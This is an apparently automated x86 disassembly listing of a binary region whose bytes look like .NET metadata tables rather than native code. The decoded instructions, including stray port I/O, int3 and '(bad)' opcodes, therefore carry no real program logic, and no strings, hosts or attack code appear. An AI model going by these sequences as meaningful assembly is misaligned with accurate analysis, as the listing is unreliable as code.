  406974:	0f 15 6b 01          	unpckhps 0x1(%ebx),%xmm5
  406978:	59                   	pop    %ecx
  406979:	00 45 25             	add    %al,0x25(%ebp)
  40697c:	00 00                	add    %al,(%eax)
  40697e:	00 00                	add    %al,(%eax)
  406980:	86 08                	xchg   %cl,(%eax)
  406982:	c3                   	ret
  406983:	1d 23 02 5a 00       	sbb    $0x5a0223,%eax
  406988:	4d                   	dec    %ebp
  406989:	25 00 00 00 00       	and    $0x0,%eax
  40698e:	86 08                	xchg   %cl,(%eax)
  406990:	d1 1d 15 02 5a 00    	rcrl   $1,0x5a0215
  406996:	56                   	push   %esi
  406997:	25 00 00 00 00       	and    $0x0,%eax
  40699c:	86 08                	xchg   %cl,(%eax)
  40699e:	0e                   	push   %cs
  40699f:	22 27                	and    (%edi),%ah
  4069a1:	02 5b 00             	add    0x0(%ebx),%bl
  4069a4:	5e                   	pop    %esi
  4069a5:	25 00 00 00 00       	and    $0x0,%eax
  4069aa:	86 08                	xchg   %cl,(%eax)
  4069ac:	1a 22                	sbb    (%edx),%ah
  4069ae:	55                   	push   %ebp
  4069af:	02 5b 00             	add    0x0(%ebx),%bl
  4069b2:	c0 54 00 00 00       	rclb   $0x0,0x0(%eax,%eax,1)
  4069b7:	00 86 08 ca 25 5a    	add    %al,0x5a25ca08(%esi)
  4069bd:	02 5c 00 67          	add    0x67(%eax,%eax,1),%bl
  4069c1:	25 00 00 00 00       	and    $0x0,%eax
  4069c6:	86 08                	xchg   %cl,(%eax)
  4069c8:	ce                   	into
  4069c9:	10 5f 02             	adc    %bl,0x2(%edi)
  4069cc:	5c                   	pop    %esp
  4069cd:	00 6f 25             	add    %ch,0x25(%edi)
  4069d0:	00 00                	add    %al,(%eax)
  4069d2:	00 00                	add    %al,(%eax)
  4069d4:	e1 01                	loope  0x4069d7
  4069d6:	a2 1e 64 02 5c       	mov    %al,0x5c02641e
  4069db:	00 7c 25 00          	add    %bh,0x0(%ebp,%eiz,1)
  4069df:	00 00                	add    %al,(%eax)
  4069e1:	00 86 18 d9 1e 0e    	add    %al,0xe1ed918(%esi)
  4069e7:	00 5c 00 20          	add    %bl,0x20(%eax,%eax,1)
  4069eb:	55                   	push   %ebp
  4069ec:	00 00                	add    %al,(%eax)
  4069ee:	00 00                	add    %al,(%eax)
  4069f0:	96                   	xchg   %eax,%esi
  4069f1:	00 ff                	add    %bh,%bh
  4069f3:	00 b1 02 5c 00 8f    	add    %dh,-0x70ffa3fe(%ecx)
  4069f9:	25 00 00 00 00       	and    $0x0,%eax
  4069fe:	96                   	xchg   %eax,%esi
  4069ff:	00 d6                	add    %dl,%dh
  406a01:	13 b8 02 5e 00 44    	adc    0x44005e02(%eax),%edi
  406a07:	55                   	push   %ebp
  406a08:	00 00                	add    %al,(%eax)
  406a0a:	00 00                	add    %al,(%eax)
  406a0c:	96                   	xchg   %eax,%esi
  406a0d:	00 56 1b             	add    %dl,0x1b(%esi)
  406a10:	be 02 5f 00 78       	mov    $0x78005f02,%esi
  406a15:	20 00                	and    %al,(%eax)
  406a17:	00 00                	add    %al,(%eax)
  406a19:	00 86 18 d9 1e 0e    	add    %al,0xe1ed918(%esi)
  406a1f:	00 61 00             	add    %ah,0x0(%ecx)
  406a22:	9e                   	sahf
  406a23:	25 00 00 00 00       	and    $0x0,%eax
  406a28:	96                   	xchg   %eax,%esi
  406a29:	00 e5                	add    %ah,%ch
  406a2b:	13 c5                	adc    %ebp,%eax
  406a2d:	02 61 00             	add    0x0(%ecx),%ah
  406a30:	04 56                	add    $0x56,%al
  406a32:	00 00                	add    %al,(%eax)
  406a34:	00 00                	add    %al,(%eax)
  406a36:	96                   	xchg   %eax,%esi
  406a37:	00 41 07             	add    %al,0x7(%ecx)
  406a3a:	cb                   	lret
  406a3b:	02 62 00             	add    0x0(%edx),%ah
  406a3e:	cc                   	int3
  406a3f:	56                   	push   %esi
  406a40:	00 00                	add    %al,(%eax)
  406a42:	00 00                	add    %al,(%eax)
  406a44:	96                   	xchg   %eax,%esi
  406a45:	00 40 08             	add    %al,0x8(%eax)
  406a48:	d2 02                	rolb   %cl,(%edx)
  406a4a:	64 00 ab 25 00 00 00 	add    %ch,%fs:0x25(%ebx)
  406a51:	00 96 00 e3 16 da    	add    %dl,-0x25e91d00(%esi)
  406a57:	02 66 00             	add    0x0(%esi),%ah
  406a5a:	c6                   	(bad)
  406a5b:	25 00 00 00 00       	and    $0x0,%eax
  406a60:	96                   	xchg   %eax,%esi
  406a61:	00 10                	add    %dl,(%eax)
  406a63:	14 e1                	adc    $0xe1,%al
  406a65:	02 68 00             	add    0x0(%eax),%ch
  406a68:	e6 25                	out    %al,$0x25
  406a6a:	00 00                	add    %al,(%eax)
  406a6c:	00 00                	add    %al,(%eax)
  406a6e:	96                   	xchg   %eax,%esi
  406a6f:	00 20                	add    %ah,(%eax)
  406a71:	1b e8                	sbb    %eax,%ebp
  406a73:	02 6a 00             	add    0x0(%edx),%ch
  406a76:	6c                   	insb   (%dx),%es:(%edi)
  406a77:	57                   	push   %edi
  406a78:	00 00                	add    %al,(%eax)
  406a7a:	00 00                	add    %al,(%eax)
  406a7c:	96                   	xchg   %eax,%esi
  406a7d:	00 fc                	add    %bh,%ah
  406a7f:	26 ef                	es out %eax,(%dx)
  406a81:	02 6c 00 9c          	add    -0x64(%eax,%eax,1),%ch
  406a85:	57                   	push   %edi
  406a86:	00 00                	add    %al,(%eax)
  406a88:	00 00                	add    %al,(%eax)
  406a8a:	96                   	xchg   %eax,%esi
  406a8b:	00 41 26             	add    %al,0x26(%ecx)
  406a8e:	f6 02 6e             	testb  $0x6e,(%edx)
  406a91:	00 78 20             	add    %bh,0x20(%eax)
  406a94:	00 00                	add    %al,(%eax)
  406a96:	00 00                	add    %al,(%eax)
  406a98:	86 18                	xchg   %bl,(%eax)
  406a9a:	d9 1e                	fstps  (%esi)
  406a9c:	0e                   	push   %cs
  406a9d:	00 70 00             	add    %dh,0x0(%eax)
  406aa0:	e0 58                	loopne 0x406afa
  406aa2:	00 00                	add    %al,(%eax)
  406aa4:	00 00                	add    %al,(%eax)
  406aa6:	96                   	xchg   %eax,%esi
  406aa7:	00 48 09             	add    %cl,0x9(%eax)
  406aaa:	84 01                	test   %al,(%ecx)
  406aac:	70 00                	jo     0x406aae
  406aae:	6c                   	insb   (%dx),%es:(%edi)
  406aaf:	59                   	pop    %ecx
  406ab0:	00 00                	add    %al,(%eax)
  406ab2:	00 00                	add    %al,(%eax)
  406ab4:	96                   	xchg   %eax,%esi
  406ab5:	00 97 25 84 01 71    	add    %dl,0x71018425(%edi)
  406abb:	00 00                	add    %al,(%eax)
  406abd:	00 01                	add    %al,(%ecx)
  406abf:	00 93 07 00 00 01    	add    %dl,0x1000007(%ebx)
  406ac5:	00 ab 17 00 00 01    	add    %ch,0x1000017(%ebx)
  406acb:	00 3b                	add    %bh,(%ebx)
  406acd:	1b 00                	sbb    (%eax),%eax
  406acf:	00 01                	add    %al,(%ecx)
  406ad1:	00 0f                	add    %cl,(%edi)
  406ad3:	03 00                	add    (%eax),%eax
  406ad5:	00 01                	add    %al,(%ecx)
  406ad7:	00 df                	add    %bl,%bh
  406ad9:	04 00                	add    $0x0,%al
  406adb:	00 01                	add    %al,(%ecx)
  406add:	00 f1                	add    %dh,%cl
  406adf:	01 00                	add    %eax,(%eax)
  406ae1:	00 01                	add    %al,(%ecx)
  406ae3:	00 d6                	add    %dl,%dh
  406ae5:	15 00 00 01 00       	adc    $0x10000,%eax
  406aea:	d6                   	salc
  406aeb:	1c 00                	sbb    $0x0,%al
  406aed:	00 01                	add    %al,(%ecx)
  406aef:	00 a0 17 00 00 01    	add    %ah,0x1000017(%eax)
  406af5:	00 69 04             	add    %ch,0x4(%ecx)
  406af8:	00 00                	add    %al,(%eax)
  406afa:	01 00                	add    %eax,(%eax)
  406afc:	1e                   	push   %ds
  406afd:	0c 00                	or     $0x0,%al
  406aff:	00 01                	add    %al,(%ecx)
  406b01:	00 4a 0b             	add    %cl,0xb(%edx)
  406b04:	00 00                	add    %al,(%eax)
  406b06:	02 00                	add    (%eax),%al
  406b08:	46                   	inc    %esi
  406b09:	05 00 00 03 00       	add    $0x30000,%eax
  406b0e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406b0f:	24 00                	and    $0x0,%al
  406b11:	00 04 00             	add    %al,(%eax,%eax,1)
  406b14:	14 27                	adc    $0x27,%al
  406b16:	00 00                	add    %al,(%eax)
  406b18:	01 00                	add    %eax,(%eax)
  406b1a:	82 03 00             	addb   $0x0,(%ebx)
  406b1d:	00 01                	add    %al,(%ecx)
  406b1f:	00 49 16             	add    %cl,0x16(%ecx)
  406b22:	00 00                	add    %al,(%eax)
  406b24:	01 00                	add    %eax,(%eax)
  406b26:	57                   	push   %edi
  406b27:	16                   	push   %ss
  406b28:	00 00                	add    %al,(%eax)
  406b2a:	01 00                	add    %eax,(%eax)
  406b2c:	04 0c                	add    $0xc,%al
  406b2e:	00 00                	add    %al,(%eax)
  406b30:	01 00                	add    %eax,(%eax)
  406b32:	4f                   	dec    %edi
  406b33:	06                   	push   %es
  406b34:	00 00                	add    %al,(%eax)
  406b36:	01 00                	add    %eax,(%eax)
  406b38:	07                   	pop    %es
  406b39:	27                   	daa
  406b3a:	00 00                	add    %al,(%eax)
  406b3c:	01 00                	add    %eax,(%eax)
  406b3e:	e6 0b                	out    %al,$0xb
  406b40:	00 00                	add    %al,(%eax)
  406b42:	02 00                	add    (%eax),%al
  406b44:	e4 03                	in     $0x3,%al
  406b46:	00 00                	add    %al,(%eax)
  406b48:	03 00                	add    (%eax),%eax
  406b4a:	ba 00 00 00 01       	mov    $0x1000000,%edx
  406b4f:	00 8b 05 00 00 01    	add    %cl,0x1000005(%ebx)
  406b55:	00 ac 15 00 00 02 00 	add    %ch,0x20000(%ebp,%edx,1)
  406b5c:	61                   	popa
  406b5d:	06                   	push   %es
  406b5e:	00 00                	add    %al,(%eax)
  406b60:	01 00                	add    %eax,(%eax)
  406b62:	0b 1d 00 00 01 00    	or     0x10000,%ebx
  406b68:	2e 03 00             	add    %cs:(%eax),%eax
  406b6b:	00 02                	add    %al,(%edx)
  406b6d:	00 9a 05 00 00 03    	add    %bl,0x3000005(%edx)
  406b73:	00 41 02             	add    %al,0x2(%ecx)
  406b76:	00 00                	add    %al,(%eax)
  406b78:	01 00                	add    %eax,(%eax)
  406b7a:	d8 24 00             	fsubs  (%eax,%eax,1)
  406b7d:	00 02                	add    %al,(%edx)
  406b7f:	00 b8 09 00 00 01    	add    %bh,0x1000009(%eax)
  406b85:	00 88 07 00 00 02    	add    %cl,0x2000007(%eax)
  406b8b:	00 0c 02             	add    %cl,(%edx,%eax,1)
  406b8e:	00 00                	add    %al,(%eax)
  406b90:	01 00                	add    %eax,(%eax)
  406b92:	a2 07 00 00 01       	mov    %al,0x1000007
  406b97:	00 ca                	add    %cl,%dl
  406b99:	07                   	pop    %es
  406b9a:	00 00                	add    %al,(%eax)
  406b9c:	01 00                	add    %eax,(%eax)
  406b9e:	71 15                	jno    0x406bb5
  406ba0:	00 00                	add    %al,(%eax)
  406ba2:	01 00                	add    %eax,(%eax)
  406ba4:	d7                   	xlat   %ds:(%ebx)
  406ba5:	19 00                	sbb    %eax,(%eax)
  406ba7:	00 01                	add    %al,(%ecx)
  406ba9:	00 f1                	add    %dh,%cl
  406bab:	03 00                	add    (%eax),%eax
  406bad:	00 01                	add    %al,(%ecx)
  406baf:	00 23                	add    %ah,(%ebx)
  406bb1:	09 00                	or     %eax,(%eax)
  406bb3:	00 01                	add    %al,(%ecx)
  406bb5:	00 ad 00 00 00 01    	add    %ch,0x1000000(%ebp)
  406bbb:	00 af 07 00 00 01    	add    %ch,0x1000007(%edi)
  406bc1:	00 b8 17 00 00 01    	add    %bh,0x1000017(%eax)
  406bc7:	00 6b 08             	add    %ch,0x8(%ebx)
  406bca:	00 00                	add    %al,(%eax)
  406bcc:	01 00                	add    %eax,(%eax)
  406bce:	5e                   	pop    %esi
  406bcf:	25 00 00 02 00       	and    $0x20000,%eax
  406bd4:	0f 04                	(bad)
  406bd6:	00 00                	add    %al,(%eax)
  406bd8:	01 00                	add    %eax,(%eax)
  406bda:	3c 01                	cmp    $0x1,%al
  406bdc:	00 00                	add    %al,(%eax)
  406bde:	01 00                	add    %eax,(%eax)
  406be0:	36 04 00             	ss add $0x0,%al
  406be3:	00 01                	add    %al,(%ecx)
  406be5:	00 20                	add    %ah,(%eax)
  406be7:	03 00                	add    (%eax),%eax
  406be9:	00 01                	add    %al,(%ecx)
  406beb:	00 83 17 00 00 01    	add    %al,0x1000017(%ebx)
  406bf1:	00 ed                	add    %ch,%ch
  406bf3:	0e                   	push   %cs
  406bf4:	00 00                	add    %al,(%eax)
  406bf6:	01 00                	add    %eax,(%eax)
  406bf8:	c5 03                	lds    (%ebx),%eax
  406bfa:	00 00                	add    %al,(%eax)
  406bfc:	01 00                	add    %eax,(%eax)
  406bfe:	c8 0a 00 00          	enter  $0xa,$0x0
  406c02:	01 00                	add    %eax,(%eax)
  406c04:	b1 05                	mov    $0x5,%cl
  406c06:	00 00                	add    %al,(%eax)
  406c08:	01 00                	add    %eax,(%eax)
  406c0a:	18 26                	sbb    %ah,(%esi)
  406c0c:	00 00                	add    %al,(%eax)
  406c0e:	01 00                	add    %eax,(%eax)
  406c10:	3b 25 00 00 01 00    	cmp    0x10000,%esp
  406c16:	a1 00 00 00 01       	mov    0x1000000,%eax
  406c1b:	00 09                	add    %cl,(%ecx)
  406c1d:	09 00                	or     %eax,(%eax)
  406c1f:	00 01                	add    %al,(%ecx)
  406c21:	00 26                	add    %ah,(%esi)
  406c23:	24 00                	and    $0x0,%al
  406c25:	00 02                	add    %al,(%edx)
  406c27:	00 05 25 00 00 01    	add    %al,0x1000025
  406c2d:	00 d4                	add    %dl,%ah
  406c2f:	06                   	push   %es
  406c30:	00 00                	add    %al,(%eax)
  406c32:	01 00                	add    %eax,(%eax)
  406c34:	e2 01                	loop   0x406c37
  406c36:	00 00                	add    %al,(%eax)
  406c38:	01 00                	add    %eax,(%eax)
  406c3a:	b2 02                	mov    $0x2,%dl
  406c3c:	00 00                	add    %al,(%eax)
  406c3e:	01 00                	add    %eax,(%eax)
  406c40:	55                   	push   %ebp
  406c41:	09 00                	or     %eax,(%eax)
  406c43:	00 01                	add    %al,(%ecx)
  406c45:	00 57 01             	add    %dl,0x1(%edi)
  406c48:	00 00                	add    %al,(%eax)
  406c4a:	01 00                	add    %eax,(%eax)
  406c4c:	bf 24 00 00 01       	mov    $0x1000024,%edi
  406c51:	00 ca                	add    %cl,%dl
  406c53:	17                   	pop    %ss
  406c54:	00 00                	add    %al,(%eax)
  406c56:	01 00                	add    %eax,(%eax)
  406c58:	49                   	dec    %ecx
  406c59:	25 00 00 01 00       	and    $0x10000,%eax
  406c5e:	14 19                	adc    $0x19,%al
  406c60:	00 00                	add    %al,(%eax)
  406c62:	01 00                	add    %eax,(%eax)
  406c64:	9a 03 00 00 01 00 7c 	lcall  $0x7c00,$0x1000003
  406c6b:	05 00 00 01 00       	add    $0x10000,%eax
  406c70:	31 24 00             	xor    %esp,(%eax,%eax,1)
  406c73:	00 01                	add    %al,(%ecx)
  406c75:	00 1d 0e 00 00 02    	add    %bl,0x200000e
  406c7b:	00 d4                	add    %dl,%ah
  406c7d:	01 00                	add    %eax,(%eax)
  406c7f:	00 01                	add    %al,(%ecx)
  406c81:	00 d6                	add    %dl,%dh
  406c83:	00 00                	add    %al,(%eax)
  406c85:	00 02                	add    %al,(%edx)
  406c87:	00 94 19 00 00 01 00 	add    %dl,0x10000(%ecx,%ebx,1)
  406c8e:	18 08                	sbb    %cl,(%eax)
  406c90:	00 00                	add    %al,(%eax)
  406c92:	01 00                	add    %eax,(%eax)
  406c94:	16                   	push   %ss
  406c95:	09 00                	or     %eax,(%eax)
  406c97:	00 01                	add    %al,(%ecx)
  406c99:	00 60 02             	add    %ah,0x2(%eax)
  406c9c:	00 00                	add    %al,(%eax)
  406c9e:	01 00                	add    %eax,(%eax)
  406ca0:	7f 24                	jg     0x406cc6
  406ca2:	00 00                	add    %al,(%eax)
  406ca4:	01 00                	add    %eax,(%eax)
  406ca6:	3c 0b                	cmp    $0xb,%al
  406ca8:	00 00                	add    %al,(%eax)
  406caa:	01 00                	add    %eax,(%eax)
  406cac:	78 20                	js     0x406cce
  406cae:	00 00                	add    %al,(%eax)
  406cb0:	01 00                	add    %eax,(%eax)
  406cb2:	b1 1c                	mov    $0x1c,%cl
  406cb4:	00 00                	add    %al,(%eax)
  406cb6:	01 00                	add    %eax,(%eax)
  406cb8:	6f                   	outsl  %ds:(%esi),(%dx)
  406cb9:	05 00 00 01 00       	add    $0x10000,%eax
  406cbe:	72 16                	jb     0x406cd6
  406cc0:	00 00                	add    %al,(%eax)
  406cc2:	01 00                	add    %eax,(%eax)
  406cc4:	12 1b                	adc    (%ebx),%bl
  406cc6:	00 00                	add    %al,(%eax)
  406cc8:	01 00                	add    %eax,(%eax)
  406cca:	64 09 00             	or     %eax,%fs:(%eax)
  406ccd:	00 01                	add    %al,(%ecx)
  406ccf:	00 0b                	add    %cl,(%ebx)
  406cd1:	06                   	push   %es
  406cd2:	00 00                	add    %al,(%eax)
  406cd4:	01 00                	add    %eax,(%eax)
  406cd6:	2b 07                	sub    (%edi),%eax
  406cd8:	00 00                	add    %al,(%eax)
  406cda:	01 00                	add    %eax,(%eax)
  406cdc:	19 02                	sbb    %eax,(%edx)
  406cde:	00 00                	add    %al,(%eax)
  406ce0:	01 00                	add    %eax,(%eax)
  406ce2:	ee                   	out    %al,(%dx)
  406ce3:	26 00 00             	add    %al,%es:(%eax)
  406ce6:	02 00                	add    (%eax),%al
  406ce8:	d6                   	salc
  406ce9:	07                   	pop    %es
  406cea:	00 00                	add    %al,(%eax)
  406cec:	01 00                	add    %eax,(%eax)
  406cee:	b8 08 00 00 01       	mov    $0x1000008,%eax
  406cf3:	00 bb 0b 00 00 02    	add    %bh,0x200000b(%ebx)
  406cf9:	00 81 19 00 00 01    	add    %al,0x1000019(%ecx)
  406cff:	00 31                	add    %dh,(%ecx)
  406d01:	0b 00                	or     (%eax),%eax
  406d03:	00 01                	add    %al,(%ecx)
  406d05:	00 65 1c             	add    %ah,0x1c(%ebp)
  406d08:	00 00                	add    %al,(%eax)
  406d0a:	02 00                	add    (%eax),%al
  406d0c:	99                   	cltd
  406d0d:	06                   	push   %es
  406d0e:	00 00                	add    %al,(%eax)
  406d10:	01 00                	add    %eax,(%eax)
  406d12:	a3 20 00 00 02       	mov    %eax,0x2000020
  406d17:	00 6e 25             	add    %ch,0x25(%esi)
  406d1a:	00 00                	add    %al,(%eax)
  406d1c:	01 00                	add    %eax,(%eax)
  406d1e:	43                   	inc    %ebx
  406d1f:	06                   	push   %es
  406d20:	00 00                	add    %al,(%eax)
  406d22:	02 00                	add    (%eax),%al
  406d24:	84 1c 00             	test   %bl,(%eax,%eax,1)
  406d27:	00 01                	add    %al,(%ecx)
  406d29:	00 f5                	add    %dh,%ch
  406d2b:	13 00                	adc    (%eax),%eax
  406d2d:	00 02                	add    %al,(%edx)
  406d2f:	00 ab 08 00 00 01    	add    %ch,0x1000008(%ebx)
  406d35:	00 06                	add    %al,(%esi)
  406d37:	0e                   	push   %cs
  406d38:	00 00                	add    %al,(%eax)
  406d3a:	02 00                	add    (%eax),%al
  406d3c:	4d                   	dec    %ebp
  406d3d:	03 00                	add    (%eax),%eax
  406d3f:	00 01                	add    %al,(%ecx)
  406d41:	00 d3                	add    %dl,%bl
  406d43:	03 00                	add    (%eax),%eax
  406d45:	00 02                	add    %al,(%edx)
  406d47:	00 9f 16 00 00 01    	add    %bl,0x1000016(%edi)
  406d4d:	00 3d 0a 00 00 02    	add    %bh,0x200000a
  406d53:	00 15 1f 00 00 01    	add    %dl,0x100001f
  406d59:	00 4f 02             	add    %cl,0x2(%edi)
  406d5c:	00 00                	add    %al,(%eax)
  406d5e:	01 00                	add    %eax,(%eax)
  406d60:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  406d61:	02 16                	add    (%esi),%dl
  406d63:	00 59 00             	add    %bl,0x0(%ecx)
  406d66:	18 00                	sbb    %al,(%eax)
  406d68:	5d                   	pop    %ebp
  406d69:	00 b1 00 79 23 bb    	add    %dh,-0x44dc8700(%ecx)
  406d6f:	01 b1 00 5c 24 bf    	add    %esi,-0x40dba400(%ecx)
  406d75:	01 b1 00 87 22 0e    	add    %esi,0xe228700(%ecx)
  406d7b:	00 b9 00 c1 1e 64    	add    %bh,0x641ec100(%ecx)
  406d81:	02 c9                	add    %cl,%cl
  406d83:	00 d9                	add    %bl,%cl
  406d85:	1e                   	push   %ds
  406d86:	01 03                	add    %eax,(%ebx)
  406d88:	d1 00                	roll   $1,(%eax)
  406d8a:	d9 1e                	fstps  (%esi)
  406d8c:	0e                   	push   %cs
  406d8d:	00 d9                	add    %bl,%cl
  406d8f:	00 d9                	add    %bl,%cl
  406d91:	1e                   	push   %ds
  406d92:	2e 03 e9             	cs add %ecx,%ebp
  406d95:	00 d9                	add    %bl,%cl
  406d97:	1e                   	push   %ds
  406d98:	6b 01 f1             	imul   $0xfffffff1,(%ecx),%eax
  406d9b:	00 d9                	add    %bl,%cl
  406d9d:	1e                   	push   %ds
  406d9e:	6b 01 f9             	imul   $0xfffffff9,(%ecx),%eax
  406da1:	00 d9                	add    %bl,%cl
  406da3:	1e                   	push   %ds
  406da4:	6b 01 01             	imul   $0x1,(%ecx),%eax
  406da7:	01 d9                	add    %ebx,%ecx
  406da9:	1e                   	push   %ds
  406daa:	6b 01 09             	imul   $0x9,(%ecx),%eax
  406dad:	01 d9                	add    %ebx,%ecx
  406daf:	1e                   	push   %ds
  406db0:	6b 01 11             	imul   $0x11,(%ecx),%eax
  406db3:	01 d9                	add    %ebx,%ecx
  406db5:	1e                   	push   %ds
  406db6:	6b 01 19             	imul   $0x19,(%ecx),%eax
  406db9:	01 d9                	add    %ebx,%ecx
  406dbb:	1e                   	push   %ds
  406dbc:	6b 01 21             	imul   $0x21,(%ecx),%eax
  406dbf:	01 d9                	add    %ebx,%ecx
  406dc1:	1e                   	push   %ds
  406dc2:	6b 01 29             	imul   $0x29,(%ecx),%eax
  406dc5:	01 d9                	add    %ebx,%ecx
  406dc7:	1e                   	push   %ds
  406dc8:	6b 01 31             	imul   $0x31,(%ecx),%eax
  406dcb:	01 d9                	add    %ebx,%ecx
  406dcd:	1e                   	push   %ds
  406dce:	4b                   	dec    %ebx
  406dcf:	02 39                	add    (%ecx),%bh
  406dd1:	01 d9                	add    %ebx,%ecx
  406dd3:	1e                   	push   %ds
  406dd4:	0e                   	push   %cs
  406dd5:	00 41 01             	add    %al,0x1(%ecx)
  406dd8:	d9 1e                	fstps  (%esi)
  406dda:	6b 01 49             	imul   $0x49,(%ecx),%eax
  406ddd:	01 21                	add    %esp,(%ecx)
  406ddf:	1c 7f                	sbb    $0x7f,%al
  406de1:	00 51 01             	add    %dl,0x1(%ecx)
  406de4:	49                   	dec    %ecx
  406de5:	00 c4                	add    %al,%ah
  406de7:	03 59 01             	add    0x1(%ecx),%ebx
  406dea:	b4 22                	mov    $0x22,%ah
  406dec:	7f 00                	jg     0x406dee
  406dee:	51                   	push   %ecx
  406def:	01 cd                	add    %ecx,%ebp
  406df1:	19 84 00 09 00 d9 1e 	sbb    %eax,0x1ed90009(%eax,%eax,1)
  406df8:	0e                   	push   %cs
  406df9:	00 61 01             	add    %ah,0x1(%ecx)
  406dfc:	8f 00                	pop    (%eax)
  406dfe:	cd 03                	int    $0x3
  406e00:	51                   	push   %ecx
  406e01:	01 ca                	add    %ecx,%edx
  406e03:	14 2a                	adc    $0x2a,%al
  406e05:	01 61 01             	add    %esp,0x1(%ecx)
  406e08:	1c 15                	sbb    $0x15,%al
  406e0a:	d3 03                	roll   %cl,(%ebx)
  406e0c:	11 00                	adc    %eax,(%eax)
  406e0e:	d9 1e                	fstps  (%esi)
  406e10:	2b 02                	sub    (%edx),%eax
  406e12:	11 00                	adc    %eax,(%eax)
  406e14:	fe                   	(bad)
  406e15:	25 d9 03 69 01       	and    $0x16903d9,%eax
  406e1a:	d6                   	salc
  406e1b:	25 df 03 61 01       	and    $0x16103df,%eax
  406e20:	45                   	inc    %ebp
  406e21:	20 e5                	and    %ah,%ch
  406e23:	03 81 01 ba 01 c7    	add    -0x38fe45ff(%ecx),%eax
  406e29:	00 79 01             	add    %bh,0x1(%ecx)
  406e2c:	0e                   	push   %cs
  406e2d:	16                   	push   %ss
  406e2e:	eb 03                	jmp    0x406e33
  406e30:	19 00                	sbb    %eax,(%eax)
  406e32:	d9 1e                	fstps  (%esi)
  406e34:	09 04 19             	or     %eax,(%ecx,%ebx,1)
  406e37:	00 b4 13 01 03 19 00 	add    %dh,0x190301(%ebx,%edx,1)
  406e3e:	a1 13 01 03 c1       	mov    0xc1030113,%eax
  406e43:	01 97 26 16 04 c1    	add    %edx,-0x3efbe9da(%edi)
  406e49:	01 ae 22 1c 04 d1    	add    %ebp,-0x2efbe3de(%esi)
  406e4f:	01 d9                	add    %ebx,%ecx
  406e51:	1e                   	push   %ds
  406e52:	0e                   	push   %cs
  406e53:	00 d1                	add    %dl,%cl
  406e55:	01 60 24             	add    %esp,0x24(%eax)
  406e58:	23 04 d9             	and    (%ecx,%ebx,8),%eax
  406e5b:	01 e6                	add    %esp,%esi
  406e5d:	1f                   	pop    %ds
  406e5e:	28 04 19             	sub    %al,(%ecx,%ebx,1)
  406e61:	00 43 22             	add    %al,0x22(%ebx)
  406e64:	30 04 19             	xor    %al,(%ecx,%ebx,1)
  406e67:	00 65 0c             	add    %ah,0xc(%ebp)
  406e6a:	bf 01 19 00 43       	mov    $0x43001901,%edi
  406e6f:	22 3c 02             	and    (%edx,%eax,1),%bh
  406e72:	99                   	cltd
  406e73:	01 d9                	add    %ebx,%ecx
  406e75:	1e                   	push   %ds
  406e76:	0e                   	push   %cs
  406e77:	00 a1 01 d9 1e 36    	add    %ah,0x361ed901(%ecx)
  406e7d:	02 99 01 bd 20 38    	add    0x3820bd01(%ecx),%bl
  406e83:	04 99                	add    $0x99,%al
  406e85:	01 ea                	add    %ebp,%edx
  406e87:	14 70                	adc    $0x70,%al
  406e89:	01 c1                	add    %eax,%ecx
  406e8b:	01 ae 22 3f 04 d1    	add    %ebp,-0x2efbc0de(%esi)
  406e91:	01 60 24             	add    %esp,0x24(%eax)
  406e94:	49                   	dec    %ecx
  406e95:	04 f1                	add    $0xf1,%al
  406e97:	01 18                	add    %ebx,(%eax)
  406e99:	11 0e                	adc    %ecx,(%esi)
  406e9b:	00 f9                	add    %bh,%cl
  406e9d:	01 d9                	add    %ebx,%ecx
  406e9f:	1e                   	push   %ds
  406ea0:	4f                   	dec    %edi
  406ea1:	04 01                	add    $0x1,%al
  406ea3:	02 d9                	add    %cl,%bl
  406ea5:	1e                   	push   %ds
  406ea6:	56                   	push   %esi
  406ea7:	04 21                	add    $0x21,%al
  406ea9:	00 d9                	add    %bl,%cl
  406eab:	1e                   	push   %ds
  406eac:	5c                   	pop    %esp
  406ead:	04 19                	add    $0x19,%al
  406eaf:	00 ab 23 66 04 09    	add    %ch,0x9046623(%ebx)
  406eb5:	00 f9                	add    %bh,%cl
  406eb7:	14 47                	adc    $0x47,%al
  406eb9:	02 21                	add    (%ecx),%ah
  406ebb:	00 27                	add    %ah,(%edi)
  406ebd:	23 6c 04 29          	and    0x29(%esp,%eax,1),%ebp
  406ec1:	02 d9                	add    %cl,%bl
  406ec3:	1e                   	push   %ds
  406ec4:	56                   	push   %esi
  406ec5:	04 29                	add    $0x29,%al
  406ec7:	00 d9                	add    %bl,%cl
  406ec9:	1e                   	push   %ds
  406eca:	78 04                	js     0x406ed0
  406ecc:	31 02                	xor    %eax,(%edx)
  406ece:	d9 1e                	fstps  (%esi)
  406ed0:	56                   	push   %esi
  406ed1:	04 c1                	add    $0xc1,%al
  406ed3:	00 31                	add    %dh,(%ecx)
  406ed5:	0c 82                	or     $0x82,%al
  406ed7:	04 39                	add    $0x39,%al
  406ed9:	02 73 10             	add    0x10(%ebx),%dh
  406edc:	8f 04 31             	pop    (%ecx,%esi,1)
  406edf:	00 cd                	add    %cl,%ch
  406ee1:	20 96 04 c1 00 18    	and    %dl,0x1800c104(%esi)
  406ee7:	11 0e                	adc    %ecx,(%esi)
  406ee9:	00 19                	add    %bl,(%ecx)
  406eeb:	00 18                	add    %bl,(%eax)
  406eed:	11 0e                	adc    %ecx,(%esi)
  406eef:	00 29                	add    %ch,(%ecx)
  406ef1:	00 18                	add    %bl,(%eax)
  406ef3:	11 0e                	adc    %ecx,(%esi)
  406ef5:	00 c1                	add    %al,%cl
  406ef7:	00 29                	add    %ch,(%ecx)
  406ef9:	0c a1                	or     $0xa1,%al
  406efb:	04 49                	add    $0x49,%al
  406efd:	02 49 00             	add    0x0(%ecx),%cl
  406f00:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406f01:	04 c1                	add    $0xc1,%al
  406f03:	00 36                	add    %dh,(%esi)
  406f05:	0c ae                	or     $0xae,%al
  406f07:	04 51                	add    $0x51,%al
  406f09:	02 d9                	add    %cl,%bl
  406f0b:	1e                   	push   %ds
  406f0c:	56                   	push   %esi
  406f0d:	04 49                	add    $0x49,%al
  406f0f:	01 d9                	add    %ebx,%ecx
  406f11:	1e                   	push   %ds
  406f12:	b6 04                	mov    $0x4,%dh
  406f14:	49                   	dec    %ecx
  406f15:	01 08                	add    %ecx,(%eax)
  406f17:	24 bd                	and    $0xbd,%al
  406f19:	04 61                	add    $0x61,%al
  406f1b:	02 44 1e cf          	add    -0x31(%esi,%ebx,1),%al
